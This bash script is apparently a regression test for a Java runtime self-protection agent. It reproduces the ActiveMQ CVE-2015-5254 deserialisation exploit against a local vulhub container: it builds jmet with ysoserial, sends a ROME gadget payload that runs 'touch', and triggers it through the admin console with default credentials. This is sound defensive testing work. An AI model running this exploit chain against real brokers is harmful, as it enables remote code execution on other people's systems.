#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_ACTIVEMQ_5254_IMAGE:-vulhub/activemq:5.11.1}"
baseline_name="${OHMYRASP_VULHUB_ACTIVEMQ_5254_BASELINE_NAME:-ohmyrasp-vulhub-activemq5254-baseline}"
protected_name="${OHMYRASP_VULHUB_ACTIVEMQ_5254_PROTECTED_NAME:-ohmyrasp-vulhub-activemq5254-protected}"
baseline_web_port="${OHMYRASP_VULHUB_ACTIVEMQ_5254_BASELINE_WEB_PORT:-19290}"
baseline_openwire_port="${OHMYRASP_VULHUB_ACTIVEMQ_5254_BASELINE_OPENWIRE_PORT:-19291}"
protected_web_port="${OHMYRASP_VULHUB_ACTIVEMQ_5254_PROTECTED_WEB_PORT:-19292}"
jmet_work="${OHMYRASP_JMET_WORKDIR:-/tmp/ohmyrasp-jmet}"
jmet_jar="${OHMYRASP_JMET_JAR:-${jmet_work}/src/target/jmet-0.1.0-all.jar}"
ysoserial_jar="${OHMYRASP_YSOSERIAL_JAR:-/tmp/ohmyrasp-ysoserial/ysoserial.jar}"
success_file="/tmp/ohmyrasp-activemq5254-success"
baseline_dir="logs/vulhub-activemq-5254-java7-baseline"
protected_dir="logs/vulhub-activemq-5254-java7-protected"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

prepare_jmet() {
  local m2="${jmet_work}/m2"
  if [[ -s "$jmet_jar" ]]; then
    return
  fi
  if [[ ! -s "$ysoserial_jar" ]]; then
    echo "ysoserial jar not found at ${ysoserial_jar}; needed to build jmet" >&2
    exit 1
  fi

  mkdir -p "$jmet_work" "$m2"
  if [[ ! -d "${jmet_work}/src/.git" ]]; then
    rm -rf "${jmet_work}/src"
    git clone --depth 1 https://github.com/matthiaskaiser/jmet.git "${jmet_work}/src"
  fi

  perl -0pi -e 's#http://repo1\.maven\.org/maven2#https://repo1.maven.org/maven2#g' \
    "${jmet_work}/src/pom.xml"
  rm -f \
    "${jmet_work}/src/src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java" \
    "${jmet_work}/src/src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.java"

  docker run --rm -v "${m2}:/m2" -v "${ysoserial_jar}:/ysoserial.jar:ro" \
    maven:3.8.1-jdk-8 \
    mvn -q -Dmaven.repo.local=/m2 install:install-file \
      -Dfile=/ysoserial.jar \
      -DgroupId=com.github.frohoff \
      -DartifactId=ysoserial \
      -Dversion=0.0.5 \
      -Dpackaging=jar
  docker run --rm -v "${jmet_work}/src:/work" -v "${m2}:/m2" -w /work \
    maven:3.8.1-jdk-8 \
    bash -lc 'export MAVEN_OPTS=-Xss10m; mvn -q -Dmaven.repo.local=/m2 -DskipTests package'

  if [[ ! -s "$jmet_jar" ]]; then
    echo "jmet build did not create ${jmet_jar}" >&2
    exit 1
  fi
}

wait_for_active_mq() {
  local name="$1"
  local web_port="$2"
  local openwire_port="$3"
  local dir="$4"
  local status
  local openwire

  for attempt in $(seq 1 90); do
    status="$(curl -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
      "http://127.0.0.1:${web_port}/" 2>/dev/null || true)"
    openwire=0
    timeout 1 bash -c "</dev/tcp/127.0.0.1/${openwire_port}" >/dev/null 2>&1 \
      && openwire=1 || true
    if [[ "$status" != "000" && "$openwire" == "1" ]]; then
      printf 'ready_attempt=%s web_status=%s openwire=ready\n' "$attempt" "$status" \
        >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose ActiveMQ web and OpenWire ports" >&2
  exit 1
}

send_object_message() {
  local dir="$1"
  local status
  local jmet_dir
  local jmet_file

  jmet_dir="$(cd "$(dirname "$jmet_jar")/.." && pwd)"
  jmet_file="target/$(basename "$jmet_jar")"
  set +e
  docker run --rm --network host -v "${jmet_dir}:/work" -w /work \
    eclipse-temurin:8-jre \
    java -jar "$jmet_file" -Q event -I ActiveMQ -s \
      -Y "touch ${success_file}" -Yp ROME \
      127.0.0.1 "$baseline_openwire_port" \
    > "${dir}/jmet.log" 2>&1
  status=$?
  set -e
  printf 'jmet_status=%s\n' "$status" >> "${dir}/attempts.log"
}

trigger_message_browse() {
  local dir="$1"
  local index=0
  local link
  local url

  curl -sS -u admin:admin -o "${dir}/browse.html" -w "%{http_code}" \
    "http://127.0.0.1:${baseline_web_port}/admin/browse.jsp?JMSDestination=event" \
    > "${dir}/browse.http_status" || true

  python3 - "${dir}/browse.html" "${dir}/message-links.txt" <<'PY'
from html.parser import HTMLParser
import sys

class LinkParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() != "a":
            return
        href = dict(attrs).get("href", "")
        if "message.jsp" in href:
            self.links.append(href.replace("&amp;", "&"))

parser = LinkParser()
parser.feed(open(sys.argv[1], encoding="utf-8", errors="ignore").read())
links = list(dict.fromkeys(parser.links))
open(sys.argv[2], "w", encoding="utf-8").write("\n".join(links) + ("\n" if links else ""))
PY

  while IFS= read -r link || [[ -n "$link" ]]; do
    [[ -z "$link" ]] && continue
    index=$((index + 1))
    case "$link" in
      http://*|https://*) url="$link" ;;
      /*) url="http://127.0.0.1:${baseline_web_port}${link}" ;;
      *) url="http://127.0.0.1:${baseline_web_port}/admin/${link}" ;;
    esac
    curl -sS -u admin:admin -o "${dir}/message-${index}.html" -w "%{http_code}" \
      "$url" > "${dir}/message-${index}.http_status" || true
  done < "${dir}/message-links.txt"
  printf 'message_links=%s\n' "$index" >> "${dir}/attempts.log"
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

prepare_jmet

docker image inspect "$image" >/dev/null 2>&1 || docker pull "$image" >/dev/null
docker image inspect "$image" --format '{{json .Config.Env}}' > "${baseline_dir}/image-env.json"
docker run --rm --entrypoint sh "$image" -lc '${JAVA_HOME:-/opt/jdk}/bin/java -version || java -version' \
  > "${baseline_dir}/java-version.log" 2>&1

docker run -d --name "$baseline_name" \
  -p "${baseline_web_port}:8161" \
  -p "${baseline_openwire_port}:61616" \
  "$image" >/dev/null

wait_for_active_mq "$baseline_name" "$baseline_web_port" "$baseline_openwire_port" "$baseline_dir"
docker exec "$baseline_name" rm -f "$success_file"
send_object_message "$baseline_dir"
trigger_message_browse "$baseline_dir"

for attempt in $(seq 1 10); do
  if docker exec "$baseline_name" test -e "$success_file"; then
    printf 'baseline_marker_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
    break
  fi
  sleep 1
done
if ! docker exec "$baseline_name" test -e "$success_file"; then
  sed -n '1,160p' "${baseline_dir}/jmet.log" >&2 || true
  sed -n '1,160p' "${baseline_dir}/browse.html" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline ActiveMQ CVE-2015-5254 did not create ${success_file}" >&2
  exit 1
fi

docker run -d --name "$protected_name" \
  -p "${protected_web_port}:8161" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

sleep 3
docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
if ! grep -q 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
  sed -n '1,180p' "${protected_dir}/container.log" >&2 || true
  echo "ActiveMQ CVE-2015-5254 Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
  exit 1
fi
if docker ps --filter "name=${protected_name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
  echo "ActiveMQ CVE-2015-5254 Java 7 container unexpectedly kept running with Java 8 agent" >&2
  exit 1
fi

echo "vulhub ActiveMQ CVE-2015-5254 Java7 legacy boundary passed"
